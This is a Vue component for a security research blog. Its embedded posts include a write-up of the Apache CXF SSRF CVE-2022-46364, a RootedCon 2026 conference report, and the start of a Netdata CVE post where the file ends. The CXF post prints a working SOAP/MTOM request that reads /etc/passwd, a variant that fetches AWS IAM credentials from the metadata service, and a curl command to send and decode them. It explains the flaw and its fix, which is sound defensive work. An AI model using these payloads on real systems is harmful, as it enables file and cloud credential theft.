<template>
  <div class="blog-root">

    <!-- ── GRID VIEW ──────────────────────────────── -->
    <div v-if="!activePost" class="grid-view">
      <div class="blog-header">
        <p class="section-pre">// research & analysis</p>
        <h1 class="section-title">BLOG</h1>
        <p class="section-sub">Technical write-ups, vulnerability research and security analysis.</p>
      </div>

      <div class="posts-grid">
        <article
          v-for="post in posts"
          :key="post.id"
          class="post-card"
          @click="openPost(post)"
        >
          <div class="card-top">
            <span class="card-category">{{ post.category }}</span>
            <span class="card-cvss" v-if="post.cvss">CVSS {{ post.cvss }}</span>
          </div>
          <h2 class="card-title">{{ post.title }}</h2>
          <p class="card-excerpt">{{ post.excerpt }}</p>
          <div class="card-tags">
            <span class="card-tag" v-for="tag in post.tags" :key="tag">{{ tag }}</span>
          </div>
          <div class="card-footer">
            <span class="card-date">{{ post.date }}</span>
            <span class="card-read">{{ post.readTime }}</span>
          </div>
        </article>
      </div>
    </div>

    <!-- ── POST VIEW ──────────────────────────────── -->
    <div v-else class="post-view">
      <div class="post-actions">
        <button class="back-btn" @click="closePost()">← Back to Blog</button>
        <button class="share-btn" :class="{ copied }" @click="copyLink()">
          <span v-if="!copied">⎘ Copy link</span>
          <span v-else>✓ Copied!</span>
        </button>
      </div>

      <header class="post-header">
        <div class="post-meta-top">
          <span class="card-category">{{ activePost.category }}</span>
          <span class="card-cvss" v-if="activePost.cvss">CVSS {{ activePost.cvss }}</span>
        </div>
        <h1 class="post-title">{{ activePost.title }}</h1>
        <div class="post-meta">
          <span class="post-author">{{ activePost.author }}</span>
          <span class="meta-sep">·</span>
          <span class="post-date">{{ activePost.date }}</span>
          <span class="meta-sep">·</span>
          <span class="post-read">{{ activePost.readTime }}</span>
        </div>
        <div class="post-tags">
          <span class="card-tag" v-for="tag in activePost.tags" :key="tag">{{ tag }}</span>
        </div>
      </header>

      <div class="post-body">
        <template v-for="(block, i) in activePost.content" :key="i">
          <p      v-if="block.type === 'p'"       class="p-text" v-html="block.text"></p>
          <h2     v-else-if="block.type === 'h2'" class="p-h2">{{ block.text }}</h2>
          <h3     v-else-if="block.type === 'h3'" class="p-h3">{{ block.text }}</h3>
          <pre    v-else-if="block.type === 'code'" class="p-code"><code>{{ block.text }}</code></pre>
          <ul     v-else-if="block.type === 'ul'"  class="p-ul">
            <li v-for="(item, j) in block.items" :key="j" v-html="item"></li>
          </ul>
          <div    v-else-if="block.type === 'callout'" :class="['p-callout', block.variant]">{{ block.text }}</div>
          <table  v-else-if="block.type === 'table'" class="p-table-wrap">
            <thead><tr><th v-for="h in block.headers" :key="h">{{ h }}</th></tr></thead>
            <tbody><tr v-for="(row, ri) in block.rows" :key="ri"><td v-for="(cell, ci) in row" :key="ci">{{ cell }}</td></tr></tbody>
          </table>
          <figure v-else-if="block.type === 'image'" class="p-figure">
            <img :src="block.src" :alt="block.caption || ''" class="p-img" />
            <figcaption v-if="block.caption" class="p-caption">{{ block.caption }}</figcaption>
          </figure>
          <a v-else-if="block.type === 'github'" :href="block.url" target="_blank" rel="noopener" class="gh-card">
            <div class="gh-card-left">
              <div class="gh-header">
                <svg class="gh-icon" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                  <path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/>
                </svg>
                <span class="gh-user">{{ block.user }}</span>
                <span class="gh-slash">/</span>
                <span class="gh-repo">{{ block.repo }}</span>
              </div>
              <p class="gh-desc">{{ block.description }}</p>
              <div class="gh-footer">
                <span class="gh-lang">
                  <span class="gh-lang-dot"></span>{{ block.language }}
                </span>
                <span class="gh-cve-badge">CVE-2024-32019</span>
              </div>
            </div>
            <div class="gh-card-right">
              <span class="gh-arrow">↗</span>
            </div>
          </a>
        </template>
      </div>
    </div>

  </div>
</template>

<script setup>
import { ref, onMounted } from 'vue'
import { useRoute, useRouter } from 'vue-router'

const route = useRoute()
const router = useRouter()

const activePost = ref(null)
const copied = ref(false)

onMounted(() => {
  const postId = route.query.post
  if (postId) {
    const found = posts.value.find(p => p.id === Number(postId))
    if (found) activePost.value = found
  }
})

function openPost(post) {
  activePost.value = post
  router.replace({ path: '/blog', query: { post: post.id } })
}

function closePost() {
  activePost.value = null
  router.replace({ path: '/blog', query: {} })
}

function copyLink() {
  const url = `${window.location.origin}/blog?post=${activePost.value.id}`
  navigator.clipboard.writeText(url)
  copied.value = true
  setTimeout(() => { copied.value = false }, 2000)
}

const posts = ref([
  {
    id: 3,
    title: 'CVE-2022-46364: Critical SSRF in Apache CXF via MTOM XOP:Include',
    excerpt: 'Analysis of a critical unauthenticated Server-Side Request Forgery (CWE-918) in Apache CXF\'s MTOM implementation. An attacker embedding a crafted XOP:Include href forces the server to issue arbitrary HTTP or file:// requests, leaking internal resources and cloud metadata credentials with zero prerequisites.',
    date: 'December 2022',
    category: 'CVE Analysis',
    cvss: '9.8',
    author: 'julichaan',
    readTime: '12 min read',
    tags: ['CVE-2022-46364', 'SSRF', 'Apache CXF', 'MTOM', 'SOAP', 'CWE-918', 'Java', 'LFI'],
    content: [
      {
        type: 'callout', variant: 'info',
        text: 'CVE-2022-46364 · CVSS 9.8 (CRITICAL) · CWE-918 Server-Side Request Forgery · Apache CXF < 3.4.10 / < 3.5.5 · Published: December 13, 2022 · Discovered by: thanat0s (360 adlab)'
      },
      {
        type: 'h2', text: '1. Overview'
      },
      {
        type: 'p',
        text: 'CVE-2022-46364 is a critical-severity Server-Side Request Forgery (SSRF) vulnerability in <strong>Apache CXF</strong>, a widely deployed open-source Java framework used for building and consuming SOAP and REST services. The vulnerability resides in the MTOM (Message Transmission Optimization Mechanism) request handling layer and affects all Apache CXF versions prior to <code>3.4.10</code> and the entire <code>3.5.x</code> branch prior to <code>3.5.5</code>. A remote unauthenticated attacker can exploit <em>any</em> publicly reachable CXF endpoint — with zero prerequisites beyond network access — to trigger arbitrary outbound requests from the server, read local files, or pivot into otherwise unreachable internal systems. The CVSS 3.1 base score is <strong>9.8 (CRITICAL)</strong>, reflecting the complete absence of authentication, user interaction, or complex pre-conditions.'
      },
      {
        type: 'h2', text: '2. Technical Background: MTOM, XOP, and How Apache CXF Handles Them'
      },
      {
        type: 'p',
        text: '<strong>MTOM (Message Transmission Optimization Mechanism)</strong> is a W3C standard that optimises the transport of binary data embedded in SOAP messages. Instead of base64-encoding binary payloads inline — expensive in both size and CPU cycles — MTOM splits the message into a multipart MIME package: one part carries the SOAP envelope, and additional parts carry the binary attachments. Within the SOAP body, a placeholder element from the <strong>XOP (XML-binary Optimized Packaging)</strong> specification — <code>&lt;xop:Include&gt;</code> — references each attachment via a <code>href</code> attribute.'
      },
      {
        type: 'p',
        text: 'In a well-formed MTOM message, that <code>href</code> attribute contains a <code>cid:</code> (Content-ID) URI that resolves to one of the MIME parts within the same request. The XOP specification deliberately leaves URI scheme choice to the consuming application. In vulnerable versions of Apache CXF, the MTOM parser resolves <em>whatever</em> URI appears in the <code>href</code> attribute without any scheme validation. Values such as <code>http://internal-host/</code>, <code>https://169.254.169.254/</code>, or <code>file:///etc/passwd</code> are silently accepted and resolved server-side.'
      },
      {
        type: 'table',
        headers: ['href URI Scheme', 'Server Behaviour', 'Attacker Outcome'],
        rows: [
          ['cid: (standard)', 'Resolves to a MIME attachment in the same request', 'Intended — no security impact'],
          ['http:// / https://', 'Performs an outbound HTTP request to the supplied URL', 'SSRF — internal network access, cloud metadata theft'],
          ['file://', 'Reads the specified path from the local filesystem', 'LFI — arbitrary file read with server process privileges'],
        ]
      },
      {
        type: 'p',
        text: 'What elevates this vulnerability is the <strong>breadth of the attack surface</strong>: the MTOM code path is triggered whenever CXF processes a multipart SOAP request with the appropriate content type. This means every CXF service that accepts at least one parameter is vulnerable — regardless of its WSDL schema, business logic, or authentication configuration. The framework is the vulnerability, not any specific service configuration.'
      },
      {
        type: 'h2', text: '3. Root Cause Analysis: Missing URI Scheme Validation in MTOM Attachment Resolution'
      },
      {
        type: 'p',
        text: 'During MTOM parsing, Apache CXF\'s attachment handling code encounters each <code>&lt;xop:Include&gt;</code> element and must resolve the value of its <code>href</code> attribute to recover the corresponding bytes. In the vulnerable codebase, the resolution logic passes the attacker-controlled URI directly into the Java HTTP client stack — or the local filesystem handler, for <code>file://</code> URIs — without first verifying whether the URI scheme is a permitted <code>cid:</code> reference.'
      },
      {
        type: 'p',
        text: 'The vulnerable execution path is approximately: <em>parse multipart body → encounter <code>&lt;xop:Include href="..."&gt;</code> → resolve href directly → return resolved bytes to the service layer</em>. When the <code>href</code> contains a <code>cid:</code> reference, resolution is local and safe — it locates the matching MIME part within the same request. When it contains an external URI, resolution becomes a network or filesystem operation triggered with the server\'s own credentials and network identity. The vulnerable code made no distinction between these two cases.'
      },
      {
        type: 'callout', variant: 'warn',
        text: 'The flaw is not in the MTOM or XOP specifications themselves — it is in the implementation\'s failure to enforce that XOP:Include href values are restricted to the cid: scheme when processing untrusted input. Any external URI scheme resolved from attacker-controlled data in a server-side context is an SSRF by design.'
      },
      {
        type: 'h2', text: '4. Exploitation'
      },
      {
        type: 'p',
        text: 'The attack is self-contained in a single HTTP request. The attacker sends a crafted multipart MTOM/SOAP message to any reachable CXF endpoint; the server resolves the attacker-supplied URI and returns the retrieved content base64-encoded inside the SOAP response body. Below, each phase of the attack is examined in detail.'
      },
      {
        type: 'h3', text: 'Phase 1 — Identifying a Vulnerable CXF Endpoint'
      },
      {
        type: 'p',
        text: 'Any HTTP endpoint serving SOAP requests through Apache CXF qualifies. Common fingerprints include a WSDL descriptor accessible at <code>?wsdl</code>, response envelopes containing CXF-specific namespace declarations, or HTTP server headers identifying the application server. Products such as WildFly, JBoss EAP, and Red Hat SSO ship CXF as their bundled JAX-WS provider and are vulnerable in the affected version ranges. No knowledge of the service\'s intended interface is required — the MTOM code path triggers before the payload is validated against any service contract.'
      },
      {
        type: 'h3', text: 'Phase 2 — Crafting the Malicious MTOM Payload'
      },
      {
        type: 'p',
        text: 'The request is a standard multipart HTTP POST with <code>Content-Type: multipart/related; type="application/xop+xml"</code>. The SOAP body contains a minimal envelope with a single parameter of any accepted type. Nested inside the parameter is the <code>&lt;xop:Include&gt;</code> element with the target URI in its <code>href</code> attribute. The SOAP service schema does not need to be known — a generic envelope structure suffices to trigger the vulnerable parsing path.'
      },
      {
        type: 'code',
        text:
`POST /EmployeeService HTTP/1.1
Host: target.example.com:8080
Content-Type: multipart/related;
  type="application/xop+xml";
  boundary="----=_Part_1";
  start="<root.message@cxf.apache.org>";
  start-info="text/xml"

------=_Part_1
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <root.message@cxf.apache.org>

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ns2:getEmployee xmlns:ns2="http://service.example/">
      <arg0>
        <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
          href="file:///etc/passwd"/>
      </arg0>
    </ns2:getEmployee>
  </soap:Body>
</soap:Envelope>
------=_Part_1--`
      },
      {
        type: 'p',
        text: 'Replacing <code>file:///etc/passwd</code> with <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> shifts the attack from local file inclusion to cloud metadata SSRF — silently requesting AWS IAM role credentials from the EC2 instance metadata service. The payload structure is identical regardless of the target URI scheme.'
      },
      {
        type: 'h3', text: 'Phase 3 — Sending the Request and Decoding the Exfiltrated Content'
      },
      {
        type: 'p',
        text: 'The server processes the MTOM request, resolves the <code>href</code> URI using its own network identity and filesystem access, and returns the retrieved bytes base64-encoded within the SOAP response body. The attacker extracts and decodes the payload locally.'
      },
      {
        type: 'code',
        text:
`# Send the crafted MTOM request
curl -s -X POST "http://target.example.com:8080/EmployeeService" \\
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="----=_Part_1"; start="<root.message@cxf.apache.org>"; start-info="text/xml"' \\
  --data-binary @payload.txt > response.xml

# Extract and decode the base64-encoded exfiltrated content
grep -oP '(?<=<return>)[^<]+' response.xml | base64 -d`
      },
      {
        type: 'p',
        text: 'For <code>file:///etc/passwd</code>, the decoded output is the raw content of the server\'s <code>/etc/passwd</code> file. For a cloud metadata URI, it is a JSON credential object containing the IAM role\'s <code>AccessKeyId</code>, <code>SecretAccessKey</code>, and session <code>Token</code> — valid AWS credentials for the instance role, exploitable in subsequent API calls against the AWS control plane.'
      },
      {
        type: 'callout', variant: 'warn',
        text: 'The cloud metadata SSRF vector is particularly high-impact in containerised or serverless deployments. If the instance role carries permissions to call IAM, SSM, S3, or EC2 APIs, credential theft via this single request can chain directly into full account compromise without any further interaction with the vulnerable CXF service.'
      },
      {
        type: 'h2', text: '5. CVSS 3.1 Vector Breakdown'
      },
      {
        type: 'p',
        text: 'The assigned vector is <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code>, yielding a base score of <strong>9.8 (CRITICAL)</strong>.'
      },
      {
        type: 'table',
        headers: ['Metric', 'Value', 'Rationale'],
        rows: [
          ['Attack Vector', 'Network (N)', 'Exploitable over the network from any remote host with access to the CXF endpoint'],
          ['Attack Complexity', 'Low (L)', 'A single crafted HTTP request suffices; no race conditions, special configuration, or target fingerprinting required'],
          ['Privileges Required', 'None (N)', 'No credentials or prior access to the application are needed'],
          ['User Interaction', 'None (N)', 'No victim action is required; the server silently resolves the supplied URI on receipt of the request'],
          ['Scope', 'Unchanged (U)', 'Attacker operates within the CXF process security context throughout'],
          ['Confidentiality', 'High (H)', 'Arbitrary file reads and internal HTTP responses fully disclosed to the attacker'],
          ['Integrity', 'High (H)', 'Achievable via SSRF pivot to internal writable services (cloud control plane, management APIs)'],
          ['Availability', 'High (H)', 'Server-side resource exhaustion possible via recursive or large-payload resolution targets'],
        ]
      },
      {
        type: 'h2', text: '6. Affected Versions and Remediation'
      },
      {
        type: 'ul',
        items: [
          '<strong>Affected:</strong> Apache CXF — all versions &lt; 3.4.10',
          '<strong>Affected:</strong> Apache CXF 3.5.0 through 3.5.4 (i.e., all &lt; 3.5.5)',
          '<strong>Patched:</strong> Apache CXF 3.4.10 and Apache CXF 3.5.5',
          '<strong>Downstream products:</strong> Red Hat JBoss EAP and Red Hat Single Sign-On shipped affected CXF versions — Red Hat issued separate security advisories for both',
        ]
      },
      {
        type: 'p',
        text: 'The fix introduces URI scheme validation within the MTOM attachment resolution path: only <code>cid:</code> references pointing to MIME parts within the same request are permitted. All external URI schemes (<code>http://</code>, <code>https://</code>, <code>file://</code>, and others) are rejected before any network or filesystem access is attempted, regardless of what the service schema permits. No service-level configuration changes are required alongside the upgrade.'
      },
      {
        type: 'callout', variant: 'info',
        text: 'If immediate patching is not possible: disable MTOM support at the gateway or application layer if not required by the business. Enforce egress filtering on the CXF host to restrict outbound HTTP to explicitly whitelisted destinations. Block access to cloud metadata IP ranges (169.254.169.254, 169.254.170.2) from all application servers as a baseline defence-in-depth measure regardless of patching status.'
      },
      {
        type: 'h2', text: '7. Disclosure Timeline'
      },
      {
        type: 'table',
        headers: ['Date', 'Event'],
        rows: [
          ['December 13, 2022', 'CVE-2022-46364 published — Apache CXF Security Advisory released publicly'],
          ['December 2022', 'Apache CXF 3.4.10 and 3.5.5 released with the patch applied'],
          ['December 2022', 'Red Hat issues separate advisories for affected JBoss EAP and Red Hat SSO versions'],
          ['April 21, 2025', 'NVD record last modified'],
        ]
      },
      {
        type: 'h2', text: '8. Conclusion'
      },
      {
        type: 'p',
        text: 'CVE-2022-46364 is a clean and instructive example of how standard, well-specified protocol mechanisms become critical attack surfaces when implemented without input validation. MTOM and XOP are legitimate W3C specifications — the vulnerability is not in the standard, but in the assumption that a <code>href</code> attribute derived from an untrusted HTTP request can be safely resolved without restricting its scheme. The result is a zero-authentication, network-reachable SSRF that reduces to arbitrary file read in its simplest form and escalates to cloud credential theft and internal network pivoting in realistic production deployments. The breadth of the attack surface — every CXF endpoint, no schema knowledge required — is precisely what justifies the 9.8 score. The fix is a single validation gate; the lesson is broader: any time server-side code resolves a URI from attacker-controlled input, the permitted scheme set must be explicitly and narrowly whitelisted at the point of resolution.'
      },
    ]
  },
  {
    id: 2,
    title: 'RootedCon 2026: Three Days at the Edge of What AI Has Already Done',
    excerpt: 'XVI edition, Kinépolis Madrid. The conference opened with a Pac-Man video generated by AI — and never let you forget the irony. Notes from three days of technical talks, uncomfortable truths, and the corridors of one of Europe\'s most important security conferences.',
    date: 'March 2026',
    category: 'Conference',
    author: 'julichaan',
    readTime: '10 min read',
    tags: ['RootedCon', 'AI Security', 'LLM', 'Jailbreak', 'Prompt Injection', 'Conference', '2026'],
    content: [
      {
        type: 'callout', variant: 'info',
        text: 'RootedCon 2026 — XVI Edition · March 5–7, 2026 · Kinépolis Madrid · 270+ speakers · 10,000+ attendees · Tracks: Main, ISACA Madrid, ProtAAPP, CriptoredCON'
      },
      {
        type: 'h2', text: '1. The Opening'
      },
      {
        type: 'p',
        text: 'RootedCon turned sixteen this year. The XVI edition opened, as is tradition, with Román setting the scope — tracks, sponsors, the usual institutional framing. But what nobody quite expected was the opening video: a Pac-Man animation, fully generated with AI, chosen as the conference\'s visual identity for 2026. It was a small moment that landed harder than intended. Here was a room of researchers who spend their professional lives analysing what AI systems can and cannot do, being welcomed into the event by something those same systems had made. The irony was not lost on anyone.'
      },
      {
        type: 'p',
        text: 'The first day also carried a more formal weight: the <strong>Premio Raúl Jover 2026</strong> was awarded to <strong>Patrick Breyer</strong> — former MEP, privacy advocate, one of the most visible critics of Chat Control legislation in Europe. He accepted the award and, without pause, launched directly into his talk. That transition — award, applause, immediate technical content — set the tone for the three days that followed.'
      },
      {
        type: 'h2', text: '2. Digital Rights as Infrastructure'
      },
      {
        type: 'p',
        text: '<strong>Patrick Breyer\'s</strong> talk, <em>"Inside the Machine: The War on Digital Rights in Europe – and How Hackers Can Save Them"</em>, was not a policy lecture. It was an argument that the security community has a specific and non-delegable responsibility in the current European legislative moment. Chat Control 1.0, proposals to mandate client-side scanning, the ongoing pressure to weaken end-to-end encryption — Breyer framed these not as abstract political disputes but as technical attack surfaces targeting the entire communication stack. The "hackers can save them" part of the title was not metaphorical. His argument was that security researchers who understand what these proposals actually mean architecturally are among the few people positioned to communicate their consequences to legislators before they become law.'
      },
      {
        type: 'callout', variant: 'warn',
        text: 'Breyer\'s core argument: mandating client-side scanning does not "balance" privacy and security. It eliminates the security guarantee that encryption provides, period. The technical community is the only one that can explain clearly why these two things are not compatible.'
      },
      {
        type: 'p',
        text: 'This theme — the intersection of policy, rights, and technical reality — continued later in a roundtable titled <em>"El encaje de los derechos de las personas en la esfera ciber"</em>, moderated by <strong>Luis Fernández Delgado</strong>. The panel included <strong>Simona Levi</strong>, <strong>Borja Adsuara Varela</strong>, <strong>Cristóbal Gázquez</strong>, and <strong>Jorge Davila Muro</strong> — a mix of activists, legal academics, and technologists debating age verification schemes, the right to anonymity online, and who actually accumulates power in content moderation decisions. Civilised in format, sharp in content.'
      },
      {
        type: 'h2', text: '3. AI Is Already the Attack Surface'
      },
      {
        type: 'p',
        text: 'If there was a single phrase that felt overdue for being said out loud, it came from <strong>Aitor Herrero Fuentes</strong> (Kyndryl): <em>"La IA ya no es una herramienta; es infraestructura crítica... y también es superficie de ataque."</em> Not a prediction. A description of the current state. Agentic AI systems — assistants, coding tools, automated SOC platforms — are now load-bearing components of enterprise infrastructure in a way that most security teams have not yet fully internalized. They are also, as a consequence, targets.'
      },
      {
        type: 'h3', text: 'Jailbreak, Prompt Injection, Hallucinations — From Research to Operations'
      },
      {
        type: 'p',
        text: 'The most technically grounded AI security content came through the books being signed on the floor and the talks that surrounded them. <strong>Chema Alonso</strong> — who presented on Friday March 6 at 19:00 in Sala 25 as the final session of the day — had two books on the table: <em>"Hacking & Pentesting con Inteligencia Artificial"</em> and <em>"Hacking IA: Jailbreak, Prompt Injection, Hallucinations & Unalignment"</em>. His talk, part of a series titled <em>"Fear of the Dark"</em>, worked through four distinct threads: fear and fake news, deepfakes and sentiment analysis, identity spoofing detection, and the application of rhetorical analysis frameworks to AI-generated content. The <strong>Retórica</strong> tool he presented — an AI platform that analyses video content for fear exploitation patterns and ideological manipulation — was both technically specific and genuinely unsettling to watch in operation.'
      },
      {
        type: 'callout', variant: 'info',
        text: 'Chema described his talk before the event as something that "te va a relajar y a asustar un poco." Having attended: accurate on both counts.'
      },
      {
        type: 'h3', text: 'Agentic AI Governance — CriptoredCON Track'
      },
      {
        type: 'p',
        text: 'In the CriptoredCON track, a researcher from GFT addressed the governance challenges introduced by agentic AI systems — framing them as entities that have evolved <em>"desde simples herramientas hacia sistemas con mayores niveles de autonomía."</em> The session connected cleanly with the EU AI Act implementation timeline and the practical gap between what the regulation requires and what most organisations currently have in place to audit their AI systems\' behaviour. The CriptoredCON track has always carried a more structural, less operational tone than the main stage — this session was a good example of why it\'s worth attending.'
      },
      {
        type: 'h3', text: 'Víctor Mayoral Vilches — Levels of Autonomy in Cybersecurity'
      },
      {
        type: 'p',
        text: 'One of the most structurally coherent talks of the conference was <strong>Víctor Mayoral Vilches\'s</strong> <em>"Cybersecurity AI (CAI), ciberseguridad agéntica y superinteligencia"</em>. He presented a framework for understanding AI autonomy in security operations across five levels: Level 1 Manual (Metasploit-era tooling), Level 2 LLM-Assisted (PentestGPT, 2023), Level 3 Semi-automated (2024), Level 4 Automated CAI (2025), and Level 5 Autonomous Superintelligence. The framing was useful not as prediction but as diagnosis: most organisations are still operating at Level 1 or 2 while their adversaries are climbing toward Level 3 and 4. That gap is not abstract — it translates directly into asymmetric operational capability.'
      },
      {
        type: 'image',
        src: '/blog/rootedcon-cai.jpeg',
        caption: 'Víctor Mayoral Vilches — "Cybersecurity AI (CAI), ciberseguridad agéntica y superinteligencia" · Levels of Autonomy in Cybersecurity: from Manual (Metasploit) to Automated CAI and Superintelligence.'
      },
      {
        type: 'h3', text: 'Alejandro Vidal — Evil Maid Tiene Ojos'
      },
      {
        type: 'p',
        text: '<strong>Alejandro Vidal</strong> (<code>@dobleio</code>) presented <em>"Evil Maid Tiene Ojos: ataques evil maid adaptativos con agentes multimodales"</em> — arguably the most technically creative talk of the AI track. The classic evil maid attack assumes physical access and a fixed, predetermined payload. Vidal\'s work extends the model into adaptive territory: using multimodal agents that can perceive the environment, reason about what they observe, and modify their behaviour accordingly. The practical implications are significant. An adversary with physical access to a device no longer needs to know in advance exactly what they\'ll find — the agent can assess and act. The talk was technically dense and delivered to a packed auditorium, which seemed entirely appropriate given the subject matter.'
      },
      {
        type: 'image',
        src: '/blog/rootedcon-evil-maid.jpeg',
        caption: 'Alejandro Vidal (@dobleio) — "Evil Maid Tiene Ojos: ataques evil maid adaptativos con agentes multimodales" · RootedCon 2026, Kinépolis Madrid.'
      },
      {
        type: 'h2', text: '4. Offensive Security: What Did Not Change'
      },
      {
        type: 'p',
        text: 'The most important thing RootedCon 2026 confirmed about offensive security is that the fundamentals remain non-negotiable. The AI track was dense and necessary. It did not displace everything else.'
      },
      {
        type: 'h3', text: 'From Foothold to Full Control — Pablo San Emeterio'
      },
      {
        type: 'p',
        text: '<strong>Pablo San Emeterio\'s</strong> talk <em>"From Foothold to Full Control: el viaje del intruso"</em> was one of the cleaner structured presentations of the conference. A methodical trace of how a real attack progresses — initial access, privilege escalation, lateral movement, persistence, objective achievement — grounded in operational experience rather than theoretical models. What made it worth attending was not the individual techniques, most of which a practitioner already knows, but the framing of the complete trajectory: the decisions an attacker makes, the moments where the chain can break, and where defenders consistently fail to break it before the end state. Practical and re-watchable.'
      },
      {
        type: 'h3', text: 'Ana Nieto & Antonio Sanz (S2Grupo) — Apaleando a LAZARUS en equipo'
      },
      {
        type: 'p',
        text: 'The most operationally grounded threat intelligence talk of the conference was delivered by <strong>Ana Nieto</strong> (Head of Malware Analysis, Lab52) and <strong>Antonio Sanz</strong> (Head of DFIR, S2Grupo): <em>"Apaleando a LAZARUS en equipo: Malware + DFIR = GOAT"</em>. The premise was specific and the execution matched it. Lazarus Group — the North Korean APT consistently ranked among the most technically capable and operationally active threat actors — was not presented as a case study or a history lesson. It was presented as an active adversary, documented through the forensic record of real investigations. The combination of malware analysis (Ana\'s domain) and incident response (Antonio\'s) produced a talk where the technical detail from both disciplines reinforced rather than duplicated each other. If you investigate threat actors for a living, this was the talk to attend.'
      },
      {
        type: 'image',
        src: '/blog/rootedcon-lazarus.jpeg',
        caption: 'Ana Nieto (Head of Malware Analysis, Lab52 / S2Grupo) and Antonio Sanz (Head of DFIR, S2Grupo) — "Apaleando a LAZARUS en equipo: Malware + DFIR = GOAT" · RootedCon 2026.'
      },
      {
        type: 'h3', text: 'Sultan Returns — Mobile Networks and Military Robot APIs'
      },
      {
        type: 'p',
        text: '<strong>Adrián Campazas Vega</strong> and <strong>Javier Valero</strong> presented <em>"Sultan returns: Ataques a la red móvil y a las APIs del robot militar"</em> — a talk that covered two distinct attack surfaces which have little obvious connection until you watch the full argument unfold. The mobile network segment addressed signaling vulnerabilities at a level of specificity that is rare in conference settings. The military robot API section was the less expected component: specific, documented, and the kind of target analysis that generates genuine concern about the gap between capability and defensive posture in critical systems. One of the talks I left wanting to read the full technical paper for.'
      },
      {
        type: 'h3', text: 'BSAM, BlueSpy and ESP32 — Bluetooth Research Revisited'
      },
      {
        type: 'p',
        text: 'A session covering prior Bluetooth security research — BSAM (Bluetooth Security Assessment Methodology), BlueSpy, and USB/Bluetooth tooling via ESP32 — was delivered by Antonio, who stepped in to present work originally by <strong>Miguel Tarascó</strong>. The session functioned as a coherent retrospective: what the methodology covers, how ESP32 enables practical Bluetooth attack research without specialist hardware at prohibitive cost, and where the research has moved since the original publications. Solid technical foundation content, delivered cleanly.'
      },
      {
        type: 'h2', text: '5. The Tracks Worth Noting'
      },
      {
        type: 'ul',
        items: [
          '<strong>ProtAAPP track:</strong> This year\'s ProtAAPP track was dense enough that the <strong>Cyberhades Podcast</strong> recorded a live episode from inside it — episode 0x18, with Pablo González, Chema Alonso, and Willy. The ambient quality of the track this year made it one of the better recommendations for anyone working in the public sector security space.',
          '<strong>ISACA Madrid (Sala 17):</strong> The ISACA Madrid Chapter ran its own parallel programme. Less offensive in character, more governance and compliance-oriented — but increasingly relevant as regulatory frameworks like the EU AI Act and NIS2 create compliance obligations that touch the same systems offensive researchers are testing.',
          '<strong>Asociación de Internautas:</strong> The Internautas president delivered <em>"The Artificial Intelligence Act & The Whistleblower Tool"</em> — covering the EU AI Office\'s official reporting channel and the practical mechanisms by which civil society can flag AI systems that violate the regulation. Underattended relative to its importance.',
        ]
      },
      {
        type: 'h2', text: '6. The Conference as Signal'
      },
      {
        type: 'p',
        text: 'One of the more structurally interesting things about RootedCon 2026 was the texture of what coexisted inside the same building across three days. A talk on railway safety — specifically the ASFA signaling system and its operational robustness characteristics — ran in parallel with a session on Lazarus Group TTPs. A discussion on dark patterns in Roblox occupied the same afternoon as Chema\'s closing session on AI-generated fear rhetoric. The conference has always had this quality, but the 2026 edition made the breadth feel particularly intentional. The threat landscape does not separate cleanly into offensive/defensive, technical/policy, infrastructure/consumer. RootedCon, to its credit, does not pretend otherwise.'
      },
      {
        type: 'h2', text: '7. Takeaways'
      },
      {
        type: 'ul',
        items: [
          '<strong>AI as attack surface is not a coming problem:</strong> Aitor Herrero Fuentes said it clearly. Agentic systems are already critical infrastructure. The security posture around them is not matching that status.',
          '<strong>Jailbreaking and prompt injection are operational concerns:</strong> The volume of published, practical material — two dedicated books being signed on the conference floor — signals that this is past the research phase. It is a practitioner concern now.',
          '<strong>Digital rights and security are the same problem:</strong> Patrick Breyer\'s argument is technically sound. Legislation that mandates surveillance capabilities in communication infrastructure is an attack surface, regardless of its stated intent.',
          '<strong>Offensive fundamentals remain the foundation:</strong> Pablo San Emeterio\'s talk was a good reminder that "from foothold to full control" is still a human-shaped problem. AI changes the tooling. It does not replace the knowledge of what the chain looks like.',
          '<strong>Attend the smaller tracks:</strong> CriptoredCON, ProtAAPP, and the Internautas sessions consistently held content that did not surface in post-event summaries. The main stage is not the whole conference.',
        ]
      },
      {
        type: 'h2', text: '8. Final Note'
      },
      {
        type: 'p',
        text: 'I walked out of Kinépolis on Saturday with the specific tiredness that comes from three days of trying to absorb more than is comfortable. RootedCon 2026 was not a conference about AI. It was a conference about the current state of security — in which AI is now a structural component, both as threat surface and as analytical tool, whether individual practitioners have caught up to that fact or not. The Pac-Man opening video, made by the same class of system the conference was warning about in multiple tracks, was probably the most honest framing of the week: we are building with these systems and targeting them simultaneously, sometimes in the same sentence.'
      },
    ]
  },
  {
    id: 1,
    title: 'CVE-2024-32019: Local Privilege Escalation in Netdata Agent via ndsudo',
    excerpt: 'Analysis of an untrusted search path vulnerability (CWE-426) in Netdata\'s SUID binary ndsudo that allows a local low-privileged user to escalate to root by injecting a malicious executable into the PATH resolution chain.',
    date: 'April 2024',
    category: 'CVE Analysis',
    cvss: '8.8',
    author: 'julichaan',
    readTime: '10 min read',
